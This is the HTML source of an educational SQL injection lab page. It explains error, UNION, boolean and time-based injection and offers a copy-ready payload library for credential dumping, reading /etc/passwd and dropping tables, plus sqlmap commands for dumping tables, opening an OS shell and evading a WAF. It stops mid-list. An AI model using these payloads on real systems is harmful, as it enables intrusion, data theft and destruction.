<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Lab - Dark Arts Vault | Hexworth Prime</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a1a 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #1a0a1a 0%, #2a0a2a 100%);
            border: 2px solid #a855f7;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
        }

        h1 {
            color: #a855f7;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(168, 85, 247, 0.5);
        }

        .subtitle {
            color: #dc2626;
            font-size: 1.2em;
            margin-bottom: 20px;
        }

        .ethical-warning {
            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
            border: 2px solid #fca5a5;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(220, 38, 38, 0.3);
        }

        .ethical-warning h3 {
            color: #fca5a5;
            margin-bottom: 10px;
            font-size: 1.3em;
        }

        .ethical-warning p {
            color: #fef2f2;
            line-height: 1.6;
        }

        .section {
            background: rgba(30, 10, 40, 0.6);
            border: 1px solid #a855f7;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .section h2 {
            color: #a855f7;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-bottom: 2px solid #a855f7;
            padding-bottom: 10px;
        }

        .section h3 {
            color: #c084fc;
            margin-top: 25px;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .section p, .section li {
            line-height: 1.8;
            color: #d1d5db;
            margin-bottom: 10px;
        }

        .section ul {
            margin-left: 25px;
            margin-bottom: 15px;
        }

        .code-block {
            background: #0a0a0a;
            border: 1px solid #4c1d95;
            border-radius: 5px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            position: relative;
        }

        .code-block code {
            color: #10b981;
            font-size: 0.95em;
        }

        .sql-keyword {
            color: #a855f7;
            font-weight: bold;
        }

        .sql-string {
            color: #fbbf24;
        }

        .sql-comment {
            color: #6b7280;
            font-style: italic;
        }

        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #a855f7;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.3s;
        }

        .copy-btn:hover {
            background: #9333ea;
            box-shadow: 0 0 10px rgba(168, 85, 247, 0.5);
        }

        .interactive-lab {
            background: linear-gradient(135deg, #1a0520 0%, #2a0a30 100%);
            border: 2px solid #dc2626;
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
        }

        .interactive-lab h3 {
            color: #dc2626;
            margin-bottom: 20px;
            font-size: 1.5em;
        }

        .vulnerable-form {
            background: #0a0a0a;
            border: 1px solid #4c1d95;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            color: #c084fc;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            background: #1a1a1a;
            border: 1px solid #a855f7;
            border-radius: 4px;
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            font-size: 1em;
        }

        .form-group input:focus {
            outline: none;
            border-color: #dc2626;
            box-shadow: 0 0 10px rgba(220, 38, 38, 0.3);
        }

        .submit-btn {
            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(220, 38, 38, 0.4);
        }

        .response-box {
            background: #0a0a0a;
            border: 2px solid #10b981;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            min-height: 100px;
            font-family: 'Courier New', monospace;
            color: #10b981;
            white-space: pre-wrap;
            display: none;
        }

        .response-box.error {
            border-color: #dc2626;
            color: #fca5a5;
        }

        .response-box.success {
            border-color: #10b981;
            color: #6ee7b7;
        }

        .payload-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .payload-card {
            background: #0a0a0a;
            border: 1px solid #4c1d95;
            border-radius: 5px;
            padding: 15px;
            transition: all 0.3s;
            cursor: pointer;
        }

        .payload-card:hover {
            border-color: #a855f7;
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.3);
            transform: translateY(-3px);
        }

        .payload-card h4 {
            color: #a855f7;
            margin-bottom: 10px;
        }

        .payload-card code {
            color: #10b981;
            display: block;
            margin: 10px 0;
            padding: 5px;
            background: #1a1a1a;
            border-radius: 3px;
        }

        .payload-card p {
            color: #9ca3af;
            font-size: 0.9em;
        }

        .technique-box {
            background: linear-gradient(135deg, #1a0a2a 0%, #2a0a3a 100%);
            border-left: 4px solid #a855f7;
            padding: 20px;
            margin: 15px 0;
            border-radius: 5px;
        }

        .technique-box h4 {
            color: #c084fc;
            margin-bottom: 10px;
        }

        .info-callout {
            background: rgba(168, 85, 247, 0.1);
            border-left: 4px solid #a855f7;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .warning-callout {
            background: rgba(220, 38, 38, 0.1);
            border-left: 4px solid #dc2626;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .tool-card {
            background: #1a1a1a;
            border: 1px solid #4c1d95;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
        }

        .tool-card h4 {
            color: #dc2626;
            margin-bottom: 10px;
            font-size: 1.2em;
        }

        .quiz-container {
            background: linear-gradient(135deg, #0a1a0a 0%, #0a2a1a 100%);
            border: 2px solid #10b981;
            border-radius: 10px;
            padding: 25px;
            margin-top: 30px;
        }

        .quiz-container h2 {
            color: #10b981;
            border-bottom-color: #10b981;
        }

        .question {
            background: #0a0a0a;
            border: 1px solid #059669;
            border-radius: 5px;
            padding: 20px;
            margin: 20px 0;
        }

        .question h4 {
            color: #6ee7b7;
            margin-bottom: 15px;
        }

        .option {
            background: #1a1a1a;
            border: 1px solid #374151;
            border-radius: 4px;
            padding: 10px 15px;
            margin: 8px 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .option:hover {
            border-color: #10b981;
            background: #1a2a1a;
        }

        .option.selected {
            border-color: #10b981;
            background: #0a2a1a;
        }

        .option.correct {
            border-color: #10b981;
            background: #0a3a1a;
        }

        .option.incorrect {
            border-color: #dc2626;
            background: #3a0a0a;
        }

        .quiz-result {
            background: #0a0a0a;
            border: 2px solid #10b981;
            border-radius: 5px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
            display: none;
        }

        .quiz-result h3 {
            color: #10b981;
            margin-bottom: 10px;
        }

        .progress-tracker {
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid #a855f7;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }

        .progress-bar {
            background: #1a1a1a;
            height: 30px;
            border-radius: 15px;
            overflow: hidden;
            margin: 10px 0;
        }

        .progress-fill {
            background: linear-gradient(90deg, #a855f7 0%, #dc2626 100%);
            height: 100%;
            width: 0%;
            transition: width 0.5s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .back-link {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background: #4c1d95;
            color: #e0e0e0;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .back-link:hover {
            background: #5b21b6;
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
        }

        .tab-container {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .tab {
            background: #1a1a1a;
            border: 1px solid #4c1d95;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            color: #c084fc;
        }

        .tab.active {
            background: #a855f7;
            color: white;
            border-color: #a855f7;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes glow {
            0%, 100% { box-shadow: 0 0 5px rgba(168, 85, 247, 0.5); }
            50% { box-shadow: 0 0 20px rgba(168, 85, 247, 0.8); }
        }

        .glow {
            animation: glow 2s infinite;
        }

        .table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }

        .table th,
        .table td {
            border: 1px solid #4c1d95;
            padding: 10px;
            text-align: left;
        }

        .table th {
            background: #1a0a2a;
            color: #a855f7;
        }

        .table td {
            background: #0a0a0a;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>SQL Injection Laboratory</h1>
            <p class="subtitle">Dark Arts Vault - Web Application Exploitation</p>
            <div class="progress-tracker">
                <p>Lab Progress</p>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressBar">0%</div>
                </div>
            </div>
        </header>

        <div class="ethical-warning">
            <h3>ETHICAL USE WARNING</h3>
            <p>
                This laboratory is designed for educational purposes only. SQL Injection is a critical vulnerability
                that affects real-world systems. You must ONLY test SQL injection techniques on systems you own or
                have explicit written permission to test. Unauthorized access to computer systems is illegal under
                the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. Use this knowledge responsibly
                to defend systems, not to harm them.
            </p>
        </div>

        <section class="section">
            <h2>What is SQL Injection?</h2>
            <p>
                SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an
                application's database layer. It occurs when user-supplied input is inserted into SQL queries without
                proper sanitization or parameterization, allowing attackers to manipulate the query logic.
            </p>

            <div class="info-callout">
                <strong>Impact of SQL Injection:</strong>
                <ul>
                    <li>Unauthorized access to sensitive data (credentials, personal information, financial records)</li>
                    <li>Authentication bypass (logging in as admin without credentials)</li>
                    <li>Data manipulation (modifying or deleting database records)</li>
                    <li>Remote code execution (in some database configurations)</li>
                    <li>Complete system compromise</li>
                </ul>
            </div>

            <h3>How SQL Injection Works</h3>
            <p>Consider a vulnerable login query:</p>
            <div class="code-block">
                <code>
<span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> users <span class="sql-keyword">WHERE</span> username=<span class="sql-string">'$username'</span> <span class="sql-keyword">AND</span> password=<span class="sql-string">'$password'</span>
                </code>
            </div>

            <p>If an attacker inputs: <code>' OR '1'='1</code> as username, the query becomes:</p>
            <div class="code-block">
                <code>
<span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> users <span class="sql-keyword">WHERE</span> username=<span class="sql-string">''</span> <span class="sql-keyword">OR</span> <span class="sql-string">'1'='1'</span> <span class="sql-keyword">AND</span> password=<span class="sql-string">''</span>
                </code>
            </div>

            <p>Since '1'='1' is always true, this bypasses authentication!</p>
        </section>

        <section class="section">
            <h2>Injection Points</h2>
            <p>SQL injection can occur in multiple locations where user input interacts with the database:</p>

            <div class="technique-box">
                <h4>1. GET Parameters (URL)</h4>
                <p>Most common and easiest to test. Parameters passed in the URL.</p>
                <div class="code-block">
                    <code>http://example.com/product.php?id=<span class="sql-string">1' OR 1=1--</span></code>
                </div>
            </div>

            <div class="technique-box">
                <h4>2. POST Parameters (Form Data)</h4>
                <p>Data submitted through forms (login, search, registration).</p>
                <div class="code-block">
                    <code>username=<span class="sql-string">admin' --</span>&password=anything</code>
                </div>
            </div>

            <div class="technique-box">
                <h4>3. HTTP Headers</h4>
                <p>Less common but often overlooked. User-Agent, Referer, X-Forwarded-For, etc.</p>
                <div class="code-block">
                    <code>User-Agent: <span class="sql-string">Mozilla/5.0' UNION SELECT 1,2,3--</span></code>
                </div>
            </div>

            <div class="technique-box">
                <h4>4. Cookies</h4>
                <p>Session data or tracking cookies that interact with the database.</p>
                <div class="code-block">
                    <code>Cookie: session=<span class="sql-string">abc123' OR 1=1--</span></code>
                </div>
            </div>
        </section>

        <section class="section">
            <h2>SQL Injection Types</h2>

            <div class="tab-container">
                <div class="tab active" onclick="switchTab('error-based')">Error-Based</div>
                <div class="tab" onclick="switchTab('union-based')">Union-Based</div>
                <div class="tab" onclick="switchTab('blind-boolean')">Blind (Boolean)</div>
                <div class="tab" onclick="switchTab('blind-time')">Blind (Time)</div>
            </div>

            <div id="error-based" class="tab-content active">
                <h3>Error-Based SQL Injection</h3>
                <p>
                    Exploits database error messages to extract information about the database structure.
                    When applications display verbose error messages, attackers can learn table names, column names,
                    and even data values.
                </p>

                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
<span class="sql-comment">-- Force an error to reveal database version</span>
' <span class="sql-keyword">AND</span> 1=<span class="sql-keyword">CONVERT</span>(int, @@version) <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract data through error messages (MySQL)</span>
' <span class="sql-keyword">AND</span> extractvalue(1, concat(0x7e, (<span class="sql-keyword">SELECT</span> @@version))) <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract table names</span>
' <span class="sql-keyword">AND</span> 1=<span class="sql-keyword">CONVERT</span>(int, (<span class="sql-keyword">SELECT</span> table_name <span class="sql-keyword">FROM</span> information_schema.tables)) <span class="sql-comment">--</span>
                    </code>
                </div>

                <div class="warning-callout">
                    <strong>Why it works:</strong> Databases try to convert incompatible data types, triggering errors
                    that include the data being converted. This leaks sensitive information through error messages.
                </div>
            </div>

            <div id="union-based" class="tab-content">
                <h3>Union-Based SQL Injection</h3>
                <p>
                    Uses the UNION SQL operator to combine results from the original query with results from
                    injected queries. This is one of the most powerful SQLi techniques for data extraction.
                </p>

                <h4>Step 1: Determine Number of Columns</h4>
                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
<span class="sql-comment">-- Method 1: Using ORDER BY</span>
' <span class="sql-keyword">ORDER BY</span> 1 <span class="sql-comment">--</span>
' <span class="sql-keyword">ORDER BY</span> 2 <span class="sql-comment">--</span>
' <span class="sql-keyword">ORDER BY</span> 3 <span class="sql-comment">-- (keep increasing until error)</span>

<span class="sql-comment">-- Method 2: Using UNION SELECT</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">NULL</span> <span class="sql-comment">--</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-comment">--</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-comment">-- (keep adding NULL until success)</span>
                    </code>
                </div>

                <h4>Step 2: Find Columns with String Data Type</h4>
                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-string">'a'</span>,<span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-comment">--</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">NULL</span>,<span class="sql-string">'a'</span>,<span class="sql-keyword">NULL</span> <span class="sql-comment">--</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span>,<span class="sql-string">'a'</span> <span class="sql-comment">--</span>
                    </code>
                </div>

                <h4>Step 3: Extract Database Information</h4>
                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
<span class="sql-comment">-- Get database version</span>
' <span class="sql-keyword">UNION SELECT</span> @@version,<span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-comment">--</span>

<span class="sql-comment">-- Get database name</span>
' <span class="sql-keyword">UNION SELECT</span> database(),<span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-comment">--</span>

<span class="sql-comment">-- Get all table names</span>
' <span class="sql-keyword">UNION SELECT</span> table_name,<span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-keyword">FROM</span> information_schema.tables <span class="sql-comment">--</span>

<span class="sql-comment">-- Get column names from specific table</span>
' <span class="sql-keyword">UNION SELECT</span> column_name,<span class="sql-keyword">NULL</span>,<span class="sql-keyword">NULL</span> <span class="sql-keyword">FROM</span> information_schema.columns <span class="sql-keyword">WHERE</span> table_name=<span class="sql-string">'users'</span> <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract data from users table</span>
' <span class="sql-keyword">UNION SELECT</span> username,password,email <span class="sql-keyword">FROM</span> users <span class="sql-comment">--</span>
                    </code>
                </div>
            </div>

            <div id="blind-boolean" class="tab-content">
                <h3>Blind SQL Injection - Boolean-Based</h3>
                <p>
                    When the application doesn't display database errors or query results, but behaves differently
                    based on whether the injected query returns TRUE or FALSE. Attackers can extract data one bit
                    at a time by asking TRUE/FALSE questions.
                </p>

                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
<span class="sql-comment">-- Test if injection works (page should load normally)</span>
' <span class="sql-keyword">AND</span> 1=1 <span class="sql-comment">--</span>

<span class="sql-comment">-- Test if injection works (page should behave differently)</span>
' <span class="sql-keyword">AND</span> 1=2 <span class="sql-comment">--</span>

<span class="sql-comment">-- Check if database name starts with 'a'</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">SUBSTRING</span>(database(),1,1)=<span class="sql-string">'a'</span> <span class="sql-comment">--</span>

<span class="sql-comment">-- Check length of admin password</span>
' <span class="sql-keyword">AND</span> (<span class="sql-keyword">SELECT</span> <span class="sql-keyword">LENGTH</span>(password) <span class="sql-keyword">FROM</span> users <span class="sql-keyword">WHERE</span> username=<span class="sql-string">'admin'</span>)=8 <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract first character of admin password</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">ASCII</span>(<span class="sql-keyword">SUBSTRING</span>((<span class="sql-keyword">SELECT</span> password <span class="sql-keyword">FROM</span> users <span class="sql-keyword">WHERE</span> username=<span class="sql-string">'admin'</span>),1,1))>64 <span class="sql-comment">--</span>
                    </code>
                </div>

                <div class="info-callout">
                    <strong>Process:</strong> By testing different ASCII values and character positions,
                    attackers can reconstruct the entire password character by character using binary search.
                </div>
            </div>

            <div id="blind-time" class="tab-content">
                <h3>Blind SQL Injection - Time-Based</h3>
                <p>
                    The most stealthy technique. When the application shows no visible difference for TRUE/FALSE
                    conditions, attackers can use time delays to infer information. If the query is TRUE, the
                    database waits; if FALSE, it responds immediately.
                </p>

                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
<span class="sql-comment">-- MySQL: If true, delay 5 seconds</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">IF</span>(1=1, <span class="sql-keyword">SLEEP</span>(5), 0) <span class="sql-comment">--</span>

<span class="sql-comment">-- PostgreSQL: Delay 5 seconds</span>
' <span class="sql-keyword">AND</span> pg_sleep(5) <span class="sql-comment">--</span>

<span class="sql-comment">-- SQL Server: Delay 5 seconds</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">WAITFOR</span> <span class="sql-keyword">DELAY</span> <span class="sql-string">'00:00:05'</span> <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract database name first character</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">IF</span>(<span class="sql-keyword">SUBSTRING</span>(database(),1,1)=<span class="sql-string">'a'</span>, <span class="sql-keyword">SLEEP</span>(5), 0) <span class="sql-comment">--</span>

<span class="sql-comment">-- Check if admin exists</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">IF</span>((<span class="sql-keyword">SELECT</span> <span class="sql-keyword">COUNT</span>(*) <span class="sql-keyword">FROM</span> users <span class="sql-keyword">WHERE</span> username=<span class="sql-string">'admin'</span>)>0, <span class="sql-keyword">SLEEP</span>(5), 0) <span class="sql-comment">--</span>
                    </code>
                </div>

                <div class="warning-callout">
                    <strong>Detection:</strong> Time-based SQLi is harder to detect but slower to exploit.
                    Each bit of information requires a separate request with measurable delay.
                </div>
            </div>
        </section>

        <section class="interactive-lab">
            <h3>Interactive SQL Injection Simulator</h3>
            <p>Practice SQL injection techniques in this simulated vulnerable login form. Try different payloads and see how the backend would respond.</p>

            <div class="vulnerable-form">
                <h4>Vulnerable Login Form (Client-Side Simulation)</h4>
                <p style="color: #9ca3af; margin-bottom: 15px;">
                    Backend Query: <code style="color: #fbbf24;">SELECT * FROM users WHERE username='$INPUT' AND password='$INPUT'</code>
                </p>

                <form id="vulnForm" onsubmit="return false;">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" id="username" placeholder="Try: admin' OR '1'='1' --">
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" id="password" placeholder="anything">
                    </div>
                    <button type="button" class="submit-btn" onclick="testInjection()">Login (Test Injection)</button>
                    <button type="button" class="submit-btn" onclick="resetForm()" style="background: #4c1d95;">Reset</button>
                </form>

                <div id="responseBox" class="response-box"></div>
            </div>

            <div class="info-callout">
                <strong>Try These Payloads:</strong>
                <ul>
                    <li><code>' OR '1'='1' --</code> - Classic authentication bypass</li>
                    <li><code>admin' --</code> - Comment out password check</li>
                    <li><code>' UNION SELECT 1,2,3 --</code> - Union-based injection</li>
                    <li><code>' AND 1=1 --</code> - Boolean-based test (TRUE)</li>
                    <li><code>' AND 1=2 --</code> - Boolean-based test (FALSE)</li>
                </ul>
            </div>
        </section>

        <section class="section">
            <h2>Testing Methodology</h2>
            <p>A systematic approach to discovering and exploiting SQL injection vulnerabilities:</p>

            <h3>Phase 1: Detection</h3>
            <div class="code-block">
                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                <code>
<span class="sql-comment">-- Test for vulnerability with single quote</span>
'

<span class="sql-comment">-- Test with comment characters</span>
' <span class="sql-comment">--</span>
' #
'/*

<span class="sql-comment">-- Boolean tests</span>
' <span class="sql-keyword">AND</span> 1=1 <span class="sql-comment">--</span>
' <span class="sql-keyword">AND</span> 1=2 <span class="sql-comment">--</span>

<span class="sql-comment">-- Time-based detection</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">SLEEP</span>(5) <span class="sql-comment">--</span>
                </code>
            </div>

            <h3>Phase 2: Fingerprinting</h3>
            <div class="code-block">
                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                <code>
<span class="sql-comment">-- Identify database type</span>
' <span class="sql-keyword">AND</span> @@version <span class="sql-comment">-- (SQL Server)</span>
' <span class="sql-keyword">AND</span> version() <span class="sql-comment">-- (PostgreSQL/MySQL)</span>

<span class="sql-comment">-- MySQL specific</span>
' <span class="sql-keyword">AND</span> <span class="sql-keyword">SUBSTRING</span>(@@version,1,1)=<span class="sql-string">'5'</span> <span class="sql-comment">--</span>

<span class="sql-comment">-- Count tables</span>
' <span class="sql-keyword">AND</span> (<span class="sql-keyword">SELECT</span> <span class="sql-keyword">COUNT</span>(*) <span class="sql-keyword">FROM</span> information_schema.tables)>0 <span class="sql-comment">--</span>
                </code>
            </div>

            <h3>Phase 3: Enumeration</h3>
            <div class="code-block">
                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                <code>
<span class="sql-comment">-- ORDER BY enumeration (find column count)</span>
' <span class="sql-keyword">ORDER BY</span> 1 <span class="sql-comment">--</span>
' <span class="sql-keyword">ORDER BY</span> 2 <span class="sql-comment">--</span>
' <span class="sql-keyword">ORDER BY</span> 3 <span class="sql-comment">-- (increase until error)</span>

<span class="sql-comment">-- Extract database names</span>
' <span class="sql-keyword">UNION SELECT</span> schema_name,2,3 <span class="sql-keyword">FROM</span> information_schema.schemata <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract table names</span>
' <span class="sql-keyword">UNION SELECT</span> table_name,2,3 <span class="sql-keyword">FROM</span> information_schema.tables <span class="sql-keyword">WHERE</span> table_schema=database() <span class="sql-comment">--</span>

<span class="sql-comment">-- Extract column names</span>
' <span class="sql-keyword">UNION SELECT</span> column_name,2,3 <span class="sql-keyword">FROM</span> information_schema.columns <span class="sql-keyword">WHERE</span> table_name=<span class="sql-string">'users'</span> <span class="sql-comment">--</span>
                </code>
            </div>

            <h3>Phase 4: Exploitation</h3>
            <div class="code-block">
                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                <code>
<span class="sql-comment">-- Extract user credentials</span>
' <span class="sql-keyword">UNION SELECT</span> username,password,email <span class="sql-keyword">FROM</span> users <span class="sql-comment">--</span>

<span class="sql-comment">-- Concatenate multiple columns</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">CONCAT</span>(username,<span class="sql-string">':'</span>,password),2,3 <span class="sql-keyword">FROM</span> users <span class="sql-comment">--</span>

<span class="sql-comment">-- Read files (if privileges allow)</span>
' <span class="sql-keyword">UNION SELECT</span> <span class="sql-keyword">LOAD_FILE</span>(<span class="sql-string">'/etc/passwd'</span>),2,3 <span class="sql-comment">--</span>
                </code>
            </div>
        </section>

        <section class="section">
            <h2>Payload Reference Library</h2>
            <p>Common SQL injection payloads organized by purpose:</p>

            <div class="payload-grid">
                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Authentication Bypass</h4>
                    <code>' OR '1'='1' --</code>
                    <code>admin' --</code>
                    <code>' OR 1=1 #</code>
                    <p>Bypasses login by making the WHERE clause always true</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>UNION SELECT</h4>
                    <code>' UNION SELECT 1,2,3 --</code>
                    <code>' UNION SELECT NULL,NULL,NULL --</code>
                    <code>' UNION SELECT @@version,2,3 --</code>
                    <p>Combines results from injected query with original</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Database Enumeration</h4>
                    <code>' UNION SELECT table_name,2,3 FROM information_schema.tables --</code>
                    <code>' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --</code>
                    <p>Extracts database structure information</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Data Extraction</h4>
                    <code>' UNION SELECT username,password,email FROM users --</code>
                    <code>' UNION SELECT CONCAT(username,':',password),2,3 FROM users --</code>
                    <p>Retrieves sensitive data from tables</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Boolean Blind</h4>
                    <code>' AND 1=1 --</code>
                    <code>' AND SUBSTRING(database(),1,1)='a' --</code>
                    <code>' AND (SELECT COUNT(*) FROM users)>5 --</code>
                    <p>Infers information through TRUE/FALSE responses</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Time-Based Blind</h4>
                    <code>' AND IF(1=1, SLEEP(5), 0) --</code>
                    <code>' AND WAITFOR DELAY '00:00:05' --</code>
                    <code>'; WAITFOR DELAY '00:00:05' --</code>
                    <p>Uses time delays to extract information</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Comment Syntax</h4>
                    <code>-- </code>
                    <code>#</code>
                    <code>/**/</code>
                    <p>Different comment styles for various databases</p>
                </div>

                <div class="payload-card" onclick="copyPayload(this)">
                    <h4>Stacked Queries</h4>
                    <code>'; DROP TABLE users --</code>
                    <code>'; INSERT INTO users VALUES ('hacker','pass123') --</code>
                    <p>Execute multiple SQL statements (if supported)</p>
                </div>
            </div>
        </section>

        <section class="section">
            <h2>Exploitation Tools</h2>

            <div class="tool-card">
                <h4>SQLmap - Automated SQL Injection Tool</h4>
                <p>The most powerful open-source SQL injection and database takeover tool.</p>

                <h4 style="color: #a855f7; margin-top: 15px;">Basic Usage:</h4>
                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                    <code>
<span class="sql-comment"># Test a GET parameter</span>
sqlmap -u "http://example.com/page.php?id=1"

<span class="sql-comment"># Test POST data</span>
sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"

<span class="sql-comment"># Enumerate databases</span>
sqlmap -u "http://example.com/page.php?id=1" --dbs

<span class="sql-comment"># Enumerate tables in specific database</span>
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

<span class="sql-comment"># Dump specific table</span>
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump

<span class="sql-comment"># Test with cookies</span>
sqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"

<span class="sql-comment"># Use Burp Suite request file</span>
sqlmap -r request.txt

<span class="sql-comment"># Advanced: OS shell (if privileges allow)</span>
sqlmap -u "http://example.com/page.php?id=1" --os-shell
                    </code>
                </div>

                <h4 style="color: #a855f7; margin-top: 15px;">Useful SQLmap Options:</h4>
                <ul>
                    <li><code>--level=5</code> - Increase test depth (1-5)</li>
                    <li><code>--risk=3</code> - Increase test risk (1-3)</li>
                    <li><code>--batch</code> - Never ask for user input, use defaults</li>
                    <li><code>--random-agent</code> - Use random User-Agent</li>
                    <li><code>--threads=10</code> - Increase speed with threads</li>
                    <li><code>--tamper=space2comment</code> - Use tamper scripts to bypass WAF</li>
                </ul>
            </div>

            <div class="tool-card">
                <h4>Burp Suite - Manual Testing</h4>
                <p>Industry-standard web application security testing platform.</p>

                <h4 style="color: #a855f7; margin-top: 15px;">SQLi Testing Workflow:</h4>
                <ol>
                    <li>Capture request in Burp Proxy</li>
                    <li>Send to Repeater (Ctrl+R)</li>
                    <li>Modify parameters with SQLi payloads</li>
                    <li>Analyze responses for differences</li>
                    <li>Use Intruder for automated payload testing</li>
                </ol>

                <div class="info-callout">
                    <strong>Burp Intruder Payload Lists:</strong>
                    <ul>
                        <li>SQL Injection (Generic)</li>
